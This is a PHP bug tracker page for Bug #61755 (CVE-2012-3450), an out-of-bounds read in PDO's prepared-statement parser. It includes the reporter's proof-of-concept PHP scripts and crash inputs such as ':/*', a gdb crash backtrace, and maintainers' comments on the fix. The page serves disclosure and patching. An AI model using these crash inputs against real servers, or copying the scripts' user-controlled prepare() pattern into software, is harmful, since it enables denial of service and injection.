<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='PDO related Bug #61755 - RDF' href='rss/bug.php?id=61755'>
        <link rel='alternate' type='application/rss+xml' title='PDO related Bug #61755 - RSS 2.0' href='rss/bug.php?id=61755&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Bug #61755 :: A parsing bug in the prepared statements can lead to access violations</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=61755">Bug</a>&nbsp;#61755</th>
            <td id="summary" colspan="5">A parsing bug in the prepared statements can lead to access violations</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2012-04-17 13:39 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-05-27 19:46 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>noamr &#x61;&#116; beyondsecurity &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=johannes">johannes</a> (<a href="https://people.php.net/johannes">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=PDO+related">PDO related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.4.0</td>
            <th class="details">OS:</th>
            <td>Windows and Linux</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3450" target="_blank">2012-3450</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=61755&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=61755&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=61755&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1334669971">&nbsp;</a><strong>[2012-04-17 13:39 UTC] noamr &#x61;&#116; beyondsecurity &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
Inconsistent parsing of PHP PDO prepared statements. Erroneous design of parsers 
state machine. Under special circumstances parsing of prepared statements does 
not stop leading in cycling the whole stack without terminating on \0. This 
leads to access violations, accessing of stack data, DoS.

Bug Description
There are several design errors in the state-machine responsible for parsing PHP 
PDO based statement objects. These errors are based on the state-machines 
inability to consistently check the supplied SQL-Query. Under special 
circumstances an attacker is able to force the responsible PDO code to iterate 
beyond the termination of the supplied query string resulting in a buffer out of 
bounds access. This access may lead to uncontrollable as well as attacker 
controllable behavior and Access Violations caused by the code iterating the 
whole stack and trying to access addresses beyond the stack end.

Preconditions
* PDO is used to access the DB
* For remote attacks: User must be able to directly control any part of the 
query string prior its preparation (stm-&gt;prepare()). We are well aware that this 
is a general coding fault which leads to other security relevant implications 
but sadly enough it’s also quite common in many frameworks, projects to use 
prepared statements with user controlled data instead of binding them after 
preparation.
* Mysql_real_escape() is no mitigation for this vulnerability. (As stated above, 
there are indeed many projects using user controlled data encoded by 
mysql_real_escape() like this: $argName=mysql_real_escape($_GET[‘Name’]); $db-
&gt;prepare(“SELECT * from ‘user’ where ‘username’=’$argName’; ”).execute();



Test script:
---------------
(We have several samples, these are some of them)

This poc directly prepares the statements query passed to the script via GET Request argument “query”. 
Examples: poc_pdo_short_get.php?query=/* poc_pdo_short_get.php?query=--:


&lt;?php
 try {
 $db = new PDO('mysql:host=localhost;dbname=aws', &quot;root&quot;, &quot;&quot;);
 //tokens: 
 // SELECT;*;from;'user';/*
 //$sql = &quot;SELECT * from 'user'/*&quot;;
 $stmt = $db-&gt;prepare(&quot;SELECT * from 'user'&quot;.mysql_real_escape_string($_GET['query']));
 $stmt-&gt;execute();
 //crash
 $stmt-&gt;bindColumn(2, $type, PDO::PARAM_STR, 256);
 $stmt-&gt;fetch(PDO::FETCH_BOUND);
 print_r( $type);
 }
 catch (Exception $e)
 {
 echo &quot;Failed: &quot; . $e-&gt;getMessage();
 }
 ?&gt;


&lt;?php
try {
$db = new PDO('mysql:host=localhost;dbname=aws', &quot;root&quot;, &quot;&quot;);

//tokens:
// SELECT;*;from;'user';/* 
$sql = &quot;:/*&quot;;

$stmt = $db-&gt;prepare($sql);
$stmt-&gt;execute();     // crashes php worker in pdo_parse_params()

$stmt-&gt;bindColumn(2, $type, PDO::PARAM_STR, 256);
$stmt-&gt;fetch(PDO::FETCH_BOUND);
print_r( $type);

} catch (Exception $e) {
  echo &quot;Failed: &quot; . $e-&gt;getMessage();
}

?&gt;


&lt;pre&gt;
&lt;?php
echo &quot;hmm beginning\n&quot;;
try {
$db = new PDO('mysql:host=localhost;dbname=aws', &quot;root&quot;, &quot;&quot;);
echo &quot;lets get it on\n&quot;;
//tokens:
// SELECT;*;from;'user';/* 
$sql = &quot;SELECT * from user :/**&quot;;
echo $sql;
$stmt = $db-&gt;prepare($sql);
echo &quot;prepared :)\n&quot;;
print_r($stmt);
$stmt-&gt;execute();     // crashes php worker in pdo_parse_params()
print_r($stmt);
echo &quot;executed :(\n&quot;;
$stmt-&gt;bindColumn(2, $type, PDO::PARAM_STR, 256);
$stmt-&gt;fetch(PDO::FETCH_BOUND);
echo &quot;--data-\n&quot;;
print_r( $type);
echo &quot;--data--\n&quot;;

} catch (Exception $e) {
        echo &quot;EXCEPTION&quot;;
  echo &quot;Failed: &quot; . $e-&gt;getMessage();
}
echo &quot;hmmm end\n&quot;;
?&gt;
&lt;/pre&gt;

Actual result:
--------------
root@bt:/opt/lampp# gdb ./bin/php 
(gdb) run poc_pdo_linux_short_1.php
Starting program: /opt/lampp/bin/php /opt/lampp/poc_pdo_linux_short_1.php
[Thread debugging using libthread_db enabled]

Program received signal SIGSEGV, Segmentation fault.
0x08228a81 in ?? ()
(gdb) bt
#0  0x08228a81 in ?? ()
#1  0x082280eb in pdo_parse_params ()
#2  0x08223891 in ?? ()
#3  0x084b2aad in ?? ()
#4  0x084b1f87 in execute ()
#5  0x08490ed2 in zend_execute_scripts ()
#6  0x0843f13c in php_execute_script ()
#7  0x08506b46 in main ()

</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=61755&amp;patch=bug61755.diff&amp;revision=latest" >bug61755.diff</a>
(last revision 2012-04-19 09:22 UTC by johannes@php.net)
<br><p><a href='patch-add.php?bug_id=61755'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=61755'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_patch' ><a name="1334827349">&nbsp;</a><strong>[2012-04-19 09:22 UTC] <a href="//people.php.net/johannes">johannes@php.net</a></strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: bug61755.diff
Revision:   1334827349
URL:        <a href="https://bugs.php.net/patch-display.php?bug=61755&amp;patch=bug61755.diff&amp;revision=1334827349" rel="nofollow">https://bugs.php.net/patch-display.php?bug=61755&amp;patch=bug61755.diff&amp;revision=1334827349</a>
</pre>
</div><div class='comment type_log' ><a name="1334832646">&nbsp;</a><strong>[2012-04-19 10:50 UTC] <a href="//people.php.net/johannes">johannes@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status:      Open</span>
<span class="added">+Status:      Closed</span>
<span class="removed">-Type:        Security</span>
<span class="added">+Type:        Bug</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: johannes</span>
</div></div></div><div class='comment type_comment' ><a name="1334832646">&nbsp;</a><strong>[2012-04-19 10:50 UTC] <a href="//people.php.net/johannes">johannes@php.net</a></strong>
<pre class='note'>This bug has been fixed in SVN.

Snapshots of the sources are packaged every three hours; this change
will be in the next snapshot. You can grab the snapshot at
<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.

 For Windows:

<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
 
Thank you for the report, and for helping us make PHP better.


</pre>
</div><div class='comment type_comment' ><a name="1339917538">&nbsp;</a><strong>[2012-06-17 07:18 UTC] henri &#x61;&#116; nerv &#x64;&#111;&#x74; fi</strong>
<pre class='note'>Does this issue have CVE-identifier? I can request one if you haven't already 
done so and someone verifies this is security issue.
</pre>
</div><div class='comment type_comment' ><a name="1343941733">&nbsp;</a><strong>[2012-08-02 21:08 UTC] henri &#x61;&#116; nerv &#x64;&#111;&#x74; fi</strong>
<pre class='note'>Please use CVE-2012-3450 for this issue.

CVE request: <a href="http://www.openwall.com/lists/oss-security/2012/08/02/3" rel="nofollow">http://www.openwall.com/lists/oss-security/2012/08/02/3</a>
CVE assigned: <a href="http://www.openwall.com/lists/oss-security/2012/08/02/7" rel="nofollow">http://www.openwall.com/lists/oss-security/2012/08/02/7</a>
</pre>
</div><div class='comment type_svn' ><a name="1412724408">&nbsp;</a><strong>[2014-10-07 23:26 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of johannes
Revision: <a href="http://git.php.net/?p=php-src-security.git;a=commit;h=1b78aef426a8f413ddd70854eb3fd5fbc95ef675" rel="nofollow">http://git.php.net/?p=php-src-security.git;a=commit;h=1b78aef426a8f413ddd70854eb3fd5fbc95ef675</a>
Log: Fix <a href='bug.php?id=61755'>bug #61755</a> parsing bug can lead to access violations
</pre>
</div><div class='comment type_svn' ><a name="1412725059">&nbsp;</a><strong>[2014-10-07 23:37 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of johannes
Revision: <a href="http://git.php.net/?p=php-src-security.git;a=commit;h=1b78aef426a8f413ddd70854eb3fd5fbc95ef675" rel="nofollow">http://git.php.net/?p=php-src-security.git;a=commit;h=1b78aef426a8f413ddd70854eb3fd5fbc95ef675</a>
Log: Fix <a href='bug.php?id=61755'>bug #61755</a> parsing bug can lead to access violations
</pre>
</div><div class='comment type_log' ><a name="1464378381">&nbsp;</a><strong>[2016-05-27 19:46 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2012-3450</span>
</div></div></div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
